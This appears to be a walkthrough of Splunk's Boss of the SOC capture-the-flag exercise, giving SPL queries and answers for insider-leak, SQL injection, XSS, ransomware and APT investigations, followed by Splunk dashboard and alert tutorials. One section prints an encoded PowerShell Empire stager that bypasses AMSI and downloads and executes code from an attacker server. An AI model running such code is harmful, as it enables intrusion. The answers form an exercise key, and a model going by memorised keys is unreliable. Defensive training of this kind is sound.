# Splunk Boss of the SOCv3 Walkthrough Writeup

> Source title: Splunk Boss of the SOCv3 Walkthrough Writeup : r/Splunk (reddit.com)

## SIEM solution

- collect, analyze and correlate the network and machine logs in real-time
- provides better visibility of network activities and help in speeding up the detection.
- Navigation documentation: https://docs.splunk.com/Documentation/Splunk/8.1.2/SearchTutorial/NavigatingSplunk

## Splunk Forwarder

- lightweight agent installed on the endpoint intended to be monitored
- collects the data and sends it to the Splunk instance
- does not affect the endpoint's performance as it takes very few resources to process
- Key data sources are:
  - Web server generating web traffic.
  - Windows machine generating Windows Event Logs, PowerShell, and Sysmon data.
  - Linux host generating host-centric logs.
  - Database generating DB connection requests, responses, and errors.

## Splunk Indexer

- plays the main role in processing the data it receives from forwarders
- receives data, normalizes it into field-value pairs, determines the datatype of the data, and stores them as events.
- Processed data is easy to search and analyze.

## Search Head

- location within the Search & Reporting App where users can search the indexed logs
- When the user searches for a term or uses a Search language known as Splunk Search Processing Language, the request is sent to the indexer and the relevant events are returned in the form of field-value pairs.

### Answer the questions below

Upload the data attached to this task and create an index "VPN_Logs". How many events are present in the log file?

- immediately displayed once the data was imported
- **Answer:** 2862

#### How many log events by the user Maleena are captured?

- Left slide had "Interesting Fields"
- Clicked on "Username"
- A window popped up with a variety of usernames and events tied to those user names
- **Answer:** 60

#### What is the name associated with IP 107.14.182.38?

- Created a search string: source="VPNlogs.json" host="ip-10-10-40-195" sourcetype="_json" Source_ip="107.14.182.38"
- **Answer:** Smith

#### What is the number of events that originated from all countries except France?

- **Search string:**
```spl
source="VPNlogs.json" host="ip-10-10-40-195" sourcetype="_json" Source_Country !="France"
```

- **Answer:** 2814

#### How many VPN Events were observed by the IP 107.3.206.58?

- **Search string:**
```spl
source="VPNlogs.json" host="ip-10-10-40-195" sourcetype="_json" Source_ip="107.3.206.58"
```

## Splunk 2

- When opening the VM, you must make sure the time range is set to "All time" or you will be confused as to why you can't seem to follow the simplest instructions.... Sheesh... hours wasted.

## based on version 2 of the Boss of the SOC (BOTS) competition by Splunk.

- BOTSv2 Github: https://github.com/splunk/botsv2
- Resources:

http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Metadata

https://www.splunk.com/blog/2017/07/31/metadata-metalore.html

### Question 1

The first objective is to find out what competitor website she visited. What is a good starting point?

When it comes to HTTP traffic, the source and destination IP addresses should be recorded in logs. You need Amber's IP address.

You can start with the following command, index="botsv2" amber, and see what events are returned. Look at the events on the first page.

Amber's IP address is visible in the events related to PAN traffic, but it's not straightforward.

To get her IP address, we can hone in on the PAN traffic source type specifically.

- **Command:**
```spl
index="botsv2" sourcetype="pan:traffic"
```

From here, you should have Amber's IP address. You can build a new search query using this information.

It would be best if you used the HTTP stream source type in your new search query.

Using Amber's IP address, construct the following search query.

- **Command:**
```spl
index="botsv2" IPADDR sourcetype="stream:HTTP"
```

You must substitute IPADDR with Amber's IP address.

#### After this query executes, there are many events to sift through for the answer. How else can you narrow this down?

Look at the additional fields.

Another field you can add to the search query to further shrink the returned events list is the site field.

Think about it; you're investigating what competitor website Amber visited.

Expand the search query only to return the site field. Additionally, you can remove duplicate entries and display the results nicely in a table.

- **Command:**
```spl
index="botsv2" IPADDR sourcetype="stream:HTTP" | KEYWORD site | KEYWORD site
```

You must substitute KEYWORD with the Splunk commands to remove the duplicate entries and display the output in a table format.

> **Note:** The first KEYWORD is to remove the duplicate entries, and the second is to display the output in a table format.

The results returned to show the URIs that Amber visited, but which website is the one that you're looking for?

To help answer these questions: Who does Amber work for, and what industry are they in?

The competitor is in the same industry. The competitor website now should clearly be visible in the table output.

Extra: You can also use the industry as a search phrase to narrow down the results to a handful of events (1 result to be exact).

- **Command:**
```spl
index="botsv2" IPADDR sourcetype="stream:HTTP" *INDUSTRY* | KEYWORD site | KEYWORD site
```

> **Note:** Use asterisks to surround the search term.

### Questions 2-7

Amber found the executive contact information and sent him an email. Based on question 2, you know it's an image.

Since you now know the competitor website, you can construct a more specific search query isolating the results to focus on Amber's HTTP traffic to the competitor website.

- **Command:**
```spl
index="botsv2" IPADDR sourcetype="stream:HTTP" COMPETITOR_WEBSITE
```

Replace COMPETITOR_WEBSITE with the actual URI of the competitor website.

You can expand on the search query to output the specific field you want in a table format for an easy-to-read format, as we did for the previous objective.

Based on the image, you have the CEO's last name but not his first name. Maybe you can get the name in the email communication.

You can now draw your attention to email traffic, SMTP, but you need Amber's email address. You should be able to get this on your own. :)

Once you have Amber's email address, you can build a search query to focus on her email address and the competitor's website to find events that show email communication between Amber and the competitor.

- **Command:**
```spl
index="botsv2" sourcetype="stream:smtp" AMBERS_EMAIL COMPETITOR_WEBSITE
```

Replace AMBERS_EMAIL with her actual email address.

With the returned results from the above search query, you can answer your own remaining questions. :)

Answer the questions below

Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited?

Amber found the executive contact information and sent him an email. What image file displayed the executive's contact information? Answer example: /path/image.ext

What is the CEO's name? Provide the first and last name.

#### What is the CEO's email address?

#### After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?

#### What is the name of the file attachment that Amber sent to a contact at the competitor?

#### What is Amber's personal email address?

## 100 series questions

Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team.

#### What is the website domain that she visited?

- **Search string:**
```spl
index="botsv2" amber www.*.com; this yielded 13 events.
```

- started expanding the fields in the first event (an email) the "recipient email had the right domain, of course
- **Answer:** www.berkbeer.com

Amber found the executive contact information and sent him an email. What image file displayed the executive's contact information? Answer example: /path/image.ext

- Started with: index="botsv2" sourcetype="stream:HTTP" www.berkbeer.com
- noticed another potential tag: "http_content_type"
- added to search: index="botsv2" sourcetype="stream:HTTP" http_content_type= *"image"* www.berkbeer.com
- there a few potential answers
- **Answer:** /images/ceoberk.png

What is the CEO's name? Provide the first and last name.

- started with: index="botsv2" amber "berk"
- resulted in only one event
- Next: index="botsv2" source=stream:smtp content_body=*
- found some really interesting information, including some base64 but nothing useful for the question
- Next: index="botsv2" sourcetype=stream:smtp amber
- resulted in 26 entries; lots of great information; answer is within
- **Answer:** martin berk

#### What is the CEO's email address?

- It's been all over the place
- **Answer:** mberk@berkbeer.com

#### After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?

- Still the same query as the previous two
- **Answer:** hbernhard@berkbeer.com

#### What is the name of the file attachment that Amber sent to a contact at the competitor?

- same query
- **Answer:** Saccharomyces_cerevisiae_patent.docx

#### What is Amber's personal email address?

- went back to earlier string: index="botsv2" sourcetype=stream:smtp amber
- one of the emails had nothing but base64 in the content, so put it into cyberchef
- **Answer:** mbersthebest@yeastiebeastie.com

## 200 series questions

In this task, we'll attempt to tackle the 200 series questions from the BOTSv2 dataset.

> **Note:** As noted in the previous task, this guide is not the only way to query Splunk for the answers to the questions below.

### Question 1

Our first task is to identify the version of Tor that Amber installed. You can use a keyword search to get you started.

What are some good keywords? Definitely Amber. Another would be Tor. Give that a go.

- **Command:**
```spl
index="botsv2" amber tor
```

Over 300 results are returned. You can reverse the order of results (hoping the 1st event is the TOR installation) and see if you can get the answer.

You should add another keyword to this search query. I'll leave that task to you.

- **Command:**
```spl
index="botsv2" amber tor KEYWORD
```

Replace the KEYWORD with another search term to help narrow down the events to the answer.

### Questions 2 & 3

You need to determine the public IP address for brewertalk.com and the IP address performing a web vulnerability scan against it.

You should be able to tackle this one on your own. Use the previous search queries as your guide.

### Questions 4 & 5

Now that you have the attacker IP address, build your new search query with the attacker IP as the source IP.

- **Command:**
```spl
index="botsv2" src_ip="ATTACKER_IP"
```

> **Tip:** Change the Sampling to 1:100 or your query will auto-cancel and throw errors.

Yikes! The number of events returned is over 18,000 .. but that is fine.

Use the Interesting Fields to help you identify what the URI path that is being attacked is.

Once the URI path has been identified, you can use it to expand the search query further to determine what SQL function is being abused.

- **Command:**
```spl
index="botsv2" src_ip="ATTACKER_IP" uri_path="URI_PATH"
```

You should have over 600 events to sift through but fret not; the answer is there.

### Questions 6 & 7

Awesome, thus far, you have identified Amber downloaded Tor Browser (you even know the exact version). You identified what URI path and the SQL function attacked on brewertalk.com.

Your task now is to identify the cookie value that was transmitted as part of an XSS attack. The user has been identified as Kevin.

Before diving right in, get some details on Kevin. This is the first time you hear of him.

- **Command:**
```spl
index="botsv2" kevin
```

Ok, now you have Kevin's first and last name. Time to figure out the cookie value from the XSS attack.

As before, you can start with a simple keyword search.

You know that you're looking for events related to Kevin's HTTP traffic with an XSS payload, and you're focused on the cookie value.

Honestly, you should be able to tackle this one on your own as well. Use the previous search queries as your guide.

After you executed the search query that yields the events with the answer, you can identify the username used for the spear phishing attack.

Based on the question hint, you can perform a keyword search query here as well.

- **Command:**
```spl
index="botsv2" KEYWORD
```

As times before, replace KEYWORD with the actual keyword search term.

Great! You should have been able to find all the answers to the questions using basic keyword searches.

Answer the questions below

What version of TOR Browser did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.

- **Starting search:**
```spl
index="botsv2" amber TOR
```

- observed the potential to use "sourcetype" so added one of the sources that included sysmon
- also included "version" in the search
- **Query:**
```spl
index="botsv2" amber TOR version sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
```

- still has 138 events
- started looking through the "Interesting Fields" and got to "Image" which included the references to the tor browser
- **Answer:** 7.0.4

#### What is the public IPv4 address of the server running www.brewertalk.com?

- **Starting search:**
```spl
index="botsv2" www.brewertalk.com
```

- still 12,000 entries
- browsed through and eventually ran into DNS queries that held the answer
- adding "dest_port=53" would narrow this down to 659 items with the answer in the second item because the first item was the query and second item was the response
- **Answer:** 52.42.208.228

Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.

- **Starting search:**
```spl
index="botsv2" vulnerabilities www.brewertalk.com
```

- two events
- found: " src_ip: 45.77.65.211"
- no other indicates that some other search would have been better

The IP address from Q#2 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php

- **Starting search:**
```spl
index="botsv2" dest_ip=52.42.208.228 dest_port=80 uri_path=*
```

- led to 387 events
- looked through "interesting fields"
- index="botsv2" dest_ip=52.42.208.228 dest_port=80 uri_path=* http_method=POST ; suggested "/index.php" but not correct
- started filtering out things unlikely to reveal the answer
- final: index="botsv2" dest_ip=52.42.208.228 dest_port=80 uri_path=* src_ip="10.0.2.109" http_content_type!=image/png http_content_type!=text/css http_content_type!=text/javascript
- Answer: /member.php

#### What SQL function is being abused on the URI path from the previous question?

- **Starting search:**
```spl
index="botsv2" uri_path=/member.php
```

- decided I didn't need anything more to start because the URI would also assume the destination and port, among other items
- obvious query update: index="botsv2" uri_path=/member.php SQL
- if we assume this is an SQLi then there would be some form data
- final query: index="botsv2" uri_path=/member.php SQL form_data="*"
- Answer: updatexml

What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.

- **Starting search:**
```spl
index="botsv2" kevin cookie=*
```

- 12 entries
- XSS is going to be an http event so
- next: index="botsv2" kevin cookie=* http_method=*
- the first entry:

Found: cookie: mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0

- Answer: 1502408189

#### What brewertalk.com username was maliciously created by a spear phishing attack?

- stilll with the same search
- Answer: kIagerfield

## 300 Level Questions

#### Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. What is the name of this file after it was encrypted?

- **Query:**
```spl
index="botsv2" mallory pptx
```

- Answer: Frothly_marketing_campaign_Q317.pptx.crypt

#### There is a Games of Thrones movie file that was encrypted as well. What season and episode is it?

- **Query:**
```spl
index="botsv2" .crypt
```

- Answer: S07E02

Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.

- **Query:**
```spl
index=botsv2 kutekitten usb vendor
```

- make sure row numbers are turned on
- entry 5 has a "vendor id" of 058f
- Osint indicates this is Alcor Micro Corp

#### What programming language is at least part of the malware from the question above written in?

- needed to continuously upgrade the search until seeing some script
- started with the "kutekitten" thing but really hard
- the story says that mallory ran the virus, so needed to figure out mallory's username on the machine
- modified search: index=botsv2 host="maclory-air13" | spath "decorations.username" | search "decorations.username"=mallorykraeusen
- opened the window that shows the undisplayed fields and found one that showed md5 and picked one
- next search: index=botsv2 host="maclory-air13" | spath "decorations.username" | search "decorations.username"=mallorykraeusen index=botsv2 "columns.md5"=c7432c5aa5ecd16c5e176a54b8a4a2fa
- found 42 records, copied the bvalue into virus total and got nothing

Tried this: index=botsv2 host="maclory-air13" | spath "decorations.username" | search "decorations.username"=mallorykraeusen "columns.md5"="*"

- didn't work so pared down the search again: index=botsv2 kutekitten "columns.md5"="*"
- five events
- one of the hashes: 72d4d364ed91dd9418d144a2db837a6d was in virus total
- the "details" tab has the answer
- **Answer:** Perl

When was this malware first seen in the wild? Answer Guidance: YYYY-MM-DD

- on the virus total page
- **Answer:** First Seen In The Wild 2017-01-17 19:09:06 UTC

The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?

- Also on the virus total website,"behavior" tab
- **Answer:** eidk.duckdns.org

From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?

- virus total website

### Answer the questions below (400 Level)

A Federal law enforcement agency reports that Taedonggang often spear phishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?

- first search: index=botsv2 frothly zip
- final search: index=botsv2 source=stream:smtp| spath "attach_filename{}" | search "attach_filename{}"="*"
- answer: invoice.zip
- the content is encoded in base64

#### What is the password to open the zip file?

- Search: index=botsv2 invoice.zip password
- results in four events
- password is in the details of one of the emails
- **Answer:** 912345678
- we can now use the password and the base64 in CyberChef to retrieve the file
- turn off autobake
- put in the base64 and add the "from base64", turn on strict mode
- add the "unzip" put in the password
- then click "bake"
- once the file is unzip, download the file
- run "md5sum" on the file (3709eef2d72de0de72649ebdaf3e4082)
- put the hash into virus total
- run "file invoice.doc" and you can find plenty of readable information
- Author: Ryan Kovar

The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces.

- search: index=botsv2 ssl issuer
- found the column for specific issuers
- Answer: "C = US"

#### What unusual file (for an American company) does winsys32.dll cause to be downloaded into the Frothly environment?

- started here: index=botsv2 winsys32.dll
- evolution: index=botsv2 source=stream:ftp filename="*" | spath filename | search filename!="topsecretyeast.pdf" | spath filename | search filename!="Old German Ale.pdf"| spath loadway | search loadway!=Upload
- the answer was korean characters

What is the first and last name of the poor innocent sap who was implicated in the metadata of the file that executed PowerShell Empire on the first victim's workstation? Answer example: John Smith

- document author from earlier
- Also on the virus total website
- Ryan Kovar

#### Within the document, what kind of points is mentioned if you found the text?

- submit the hash to https://app.runn.any and the document will come up on the screen
- **Answer:** CyberEasterEgg

To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server.

What single webpage is most contacted by these Scheduled Tasks? Answer example: index.php or images.html

- originally found the base64 while searching for powershell things
```text
WwBSAEUARgBdAC4AQQBTAFMARQBtAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAYQBMAHUAZQAoACQAbgB1AEwAbAAsACQAVAByAHUARQApAH0AOwBbAFMAWQBzAFQARQBNAC4ATgBlAHQALgBTAGUAcgBWAEkAYwBFAFAATwBpAG4AVABNAEEAbgBBAEcARQByAF0AOgA6AEUAWABQAEUAYwBUADEAMAAwAEMATwBOAHQAaQBuAHUAZQA9ADAAOwAkAHcAQwA9AE4ARQB3AC0ATwBCAGoARQBDAFQAIABTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBjAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAE8AWAB5AD0AWwBTAHkAcwB0AGUAbQAuAE4ARQB0AC4AVwBFAEIAUgBlAHEAdQBlAFMAVABdADoAOgBEAGUAZgBBAFUAbAB0AFcAZQBiAFAAcgBPAHgAeQA7ACQAVwBDAC4AUABSAG8AeAB5AC4AQwBSAEUARABlAE4AdABJAEEAbABzACAAPQAgAFsAUwB5AFMAdABlAE0ALgBOAEUAVAAuAEMAUgBlAGQARQBOAHQAaQBBAGwAQwBBAEMAaABFAF0AOgA6AEQAZQBGAEEAdQBsAFQATgBFAFQAVwBvAFIAawBDAHIAZQBEAEUATgBUAEkAYQBsAFMAOwAkAEsAPQBbAFMAeQBzAFQAZQBtAC4AVABFAHgAdAAuAEUATgBjAE8AZABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAFkAVABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAFcAQwAuAEgAZQBhAEQAZQBSAFMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AGoAawBuAFgAcABvAGEANwBwAFUAQQAwAGwARABCACsAbgBZAGkAUQB2AFUAOQB1AG4ASABnAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABBAFQAQQA9ACQAVwBDAC4ARABvAFcAbgBMAG8AQQBkAEQAYQBUAGEAKAAkAFMARQByACsAJAB0ACkAOwAkAEkAVgA9ACQARABBAFQAYQBbADAALgAuADMAXQA7ACQAZABBAFQAYQA9ACQARABhAFQAQQBbADQALgAuACQAZABhAFQAYQAuAEwAZQBOAEcAdABIAF0AOwAtAGoAbwBpAE4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
```

- Answer: process. php

## ORGANIZING DATA IN SPLUNK

- When we open Splunk, this is the screen we might be greeted with after signing in.

![ORGANIZING DATA IN SPLUNK](assets/splunk-bots-101.png)

To move forward, go to the first tab on the left menu, Search & Reporting. Clicking that, we see the following interface.

![ORGANIZING DATA IN SPLUNK](assets/splunk-bots-102.png)

Now, we can see that we have an interface for the Search app. For starters, we can start a search with the search term index=* to see what data we have here. We have set the time window to 'all time' to see the data historically present here as well.

![ORGANIZING DATA IN SPLUNK](assets/splunk-bots-103.png)

## CREATING REPORTS FOR RECURRING SEARCHES

- we often need to run specific searches from time to time
- help reduce the load on the Splunk search head
- if multiple searches need to be run at the start of every shift, running them simultaneously can increase the search head's load and processing times
- scheduled with 5 or 10-minute intervals, they will accomplish two tasks.

The searches will run automatically without any user interaction.

The searches will not run simultaneously, reducing the possibility of errors or inefficiency.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-104.png)

Here, we see a list of reports already saved in Splunk. If we want to view the saved results of a report, we can click on the report's name. However, if we want to run a new search using the same query as the one in a report, we can use the 'Open in Search' option. The 'Edit' option allows us to edit the reports. The 'Next Scheduled Time' tab shows when the report will run again. We can also see the report's owner and its associated permissions. Please note that we have selected 'All' reports to be shown in the view above. There are options for viewing only the logged-in user's reports, as well as for viewing the reports added by the App.

To create a new report, we can run a search and use the Save As option to save the search as a report.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-105.png)

Once we click the option to Save As Report, we see the following window.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-106.png)

Filling in the required data and clicking the 'Save' option here will save the search as a report.

Let's practice the same in the attached Splunk instance. We ran a search in the previous task. To create a report on a search, we will first have to understand the data. On the left tab, we will see some fields Splunk has identified that might interest us. Let's click on hosts to see the number of hosts sending logs to our Splunk instance.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-107.png)

So, we have 3 hosts; network-server, web-server, and vpn_server. They are all sending different numbers of events. If we are to determine the number of times each VPN user logged in during our given time window (which is 'all time' for this room), we will run the following query.

```spl
host=vpn_server | stats count by Username
```

This is what we get when we run this query in our instance.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-108.png)

In a SOC environment, we might want to track users who logged in during a certain time window. This requirement might be repetitive. SOC analysts can create a report for this requirement that will run every few hours for ease of use. Let's practice that based on what we learned in this task. First, we click 'Save As' and select 'Report'.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-109.png)

We fill in the required information.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-110.png)

Here, we can see the Content for this report will be a 'Statistics Table' because we used 'stats count' in our query. The 'Time Range Picker' has been set to 'Yes'. This means running the report will give us a time-range picker option. When we click 'Save', we get the following prompt, telling us the report has been created.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-111.png)

We can click the 'View' option to view our report. This is how it will look.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-112.png)

On the reports tab, we can see our report now.

![CREATING REPORTS FOR RECURRING SEARCHES](assets/splunk-bots-113.png)

We see the owner of the report is 'admin', the logged-in user. The 'Sharing' is set to Private. This means that this report can only be accessed by admin. We can use the 'Edit' option to change the permissions and set it to be used by other users.

## CREATING DASHBOARDS FOR SUMMARIZING RESULTS

Splunk provides us with the ability to create dashboards and visualizations. These dashboards and visualizations provide a user with quick info about the data present in Splunk. Dashboards are often created to help give a brief overview of the most important bits of the data. They are often helpful in presenting data and statistics to the management, such as the number of incidents in a given time frame, or for SOC analysts to figure out where to focus, such as identifying spikes and drops in data sources, which might indicate a surge in, say, failed login attempts. The primary purpose of dashboards is to provide a quick visual overview of the available information.

To move forward, let's create a dashboard in the attached VM. To start, move to the Dashboards tab. We will see the below screen.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-114.png)

In this screen, we see an option to create dashboards labeled as 1 in the screenshot. Labeled as 2 is a list of available dashboards. Please note that we have selected 'All' dashboards here instead of 'Yours' or 'This App's', which can show a different list of dashboards. Labeled as 3 is information about these dashboards, such as owner, permissions, etc. Here, we also find the option to Edit the dashboard's different properties, or set it as the home dashboard. We can also view a dashboard by clicking on the name of the dashboard. However, we don't have any dashboards yet. We can start by creating a dashboard. For that, let's click the Create Dashboard option to see the following window.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-115.png)

After filling in the relevant details, such as the name and permissions, we can choose one of the two options for dashboard creation through Classic Dashboards or Dashboard Studio.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-116.png)

We can see that we have set the permissions to 'Shared in App'. This will ensure that the dashboard is also visible to other users of Splunk. We will use the Classic Dashboard approach to create a dashboard for this room. Let's do that and click 'Create'. The Window tells us to 'Click Add Panel to Start'. When we click the 'Add Panel' option, we get the following menu on the right side.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-117.png)

We want to add the results from our report to the Dashboard. We can select the 'New from Report' option to do that.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-118.png)

The 'Add to Dashboard' option will add these results to our dashboard. However, we were already seeing the results as a report. What benefit will a dashboard provide us? The answer to that lies in visualizations. We can select a visualization from the menu, as shown below.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-119.png)

Let's select the column chart visualization and check out the results.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-120.png)

Doesn't it look nice? We can see on a cursory glance that Emma logged in the least amount of times, and Sarah logged in the most. This is the kind of information that a dashboard is helpful for. Another way dashboards can help is by adding multiple reports to a single dashboard. The process for that will be similar, as we still see the Add Panel option above. However, we will keep this task to a single report. We can flip the switch to the Dark theme and click 'Save' to save the dashboard if we like it. This is how it will look when finished.

![CREATING DASHBOARDS FOR SUMMARIZING RESULTS](assets/splunk-bots-121.png)

Now, we can go to the Dashboards menu to see our newly created dashboard.

## ALERTING ON HIGH PRIORITY EVENTS

In the previous tasks, we practiced creating reports and dashboards. We understood that when we need to run a search repetitively, we can use reports, and if we want to club a few reports together or make visualizations, we can use dashboards. However, reports and dashboards will only be viewed by users at set time intervals. Sometimes, we want to be alerted if a certain event happens, such as, if the amount of failed logins on a single account reaches a threshold, it indicates a brute force attempt, and we would like to know as soon as it happens. In this task, we will learn how to set up alerts. Unfortunately, we cannot practice setting up alerts on the attached instance because of licensing issues. However, we will explain how to set up an alert in this task.

First, we will run a search for our required search term. In the 'Save As' drop-down, we will see an option for saving as an alert. In the previous task, we identified that the user Sarah logged in the most during our time range. Therefore, let's narrow down our search to all the login events of the user Sarah.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-122.png)

When we click 'Alert' in the 'Save As' menu, we are asked to configure the alert's parameters.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-123.png)

We see the usual settings such as Title, Description and Permissions. In addition to that, we have some more options specific to alerts. The alert type we are setting up is scheduled. This means that Splunk will run this search as per the schedule, and if the trigger condition is satisfied, an alert will be raised. Depending on the license and configuration for your Splunk instance, you might get an option for scheduling Real-time alerts. Next, we have trigger conditions.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-124.png)

Trigger conditions define the conditions when the alert will be raised. Here, let's say we raise the alert when the login count of our user is more than 5. In that case, we will use the 'Number of Results' option and set the 'is greater than' option to 5. We can trigger 5 alerts for the 5 login times, or we can just trigger a single alert for exceeding this count. The 'Throttle' option lets us limit the alerts by not raising an alert in the specified time period if an alert is already triggered. This can help reduce alert fatigue, which can overwhelm analysts when there are too many alerts. The final option here is for Trigger Actions. This option allows us to define what automated steps Splunk must take when the alert is triggered. For example, we might want Splunk to send an email to the SOC email account in case of an alert.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-125.png)

Below, we can see the configured alert. We have configured it to run every hour if Sarah logs in more than 5 times. The email will only be sent once every 60 minutes.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-126.png)

If the alert is triggered, Splunk will send an email to soc@tryhackme.com.

![ALERTING ON HIGH PRIORITY EVENTS](assets/splunk-bots-127.png)

The email will be sent with the highest priority, and it will include the Subject and message mentioned above.

## Before you begin

- If you are not familiar with AWS (Amazon Web Services), you will need to perform external research to answer most of the questions.
- Depending on the questions, you might want to check which sources have certain fields.
- Below is a useful command to run to get that answer.
```spl
Command: index="botsv3" hash | stats count by sourcetype | sort -count
```

The above command will return all the source types that have the field 'hash' and the number of events per source type and sorted from largest to smallest.

Before you begin, get a lay of the land.

```spl
Command: | tstats count where index="botsv3" by sourcetype
```

- ﻿Be aware when you are running a search query that you're not Event Sampling. This can throw off your results.

You can read more about this concept here.

## AWS & other events

- ﻿In this task, you'll focus on AWS-related events with some questions focusing on endpoint-related events.
- The questions below are from the 200 series of the BOTSv3 dataset.

Question 1: List out the IAM users that accessed an AWS service (successfully or unsuccessfully) in Frothly's AWS environment? Answer guidance: Comma separated without spaces, in alphabetical order. (Example: ajackson,mjones,tmiller)

```spl
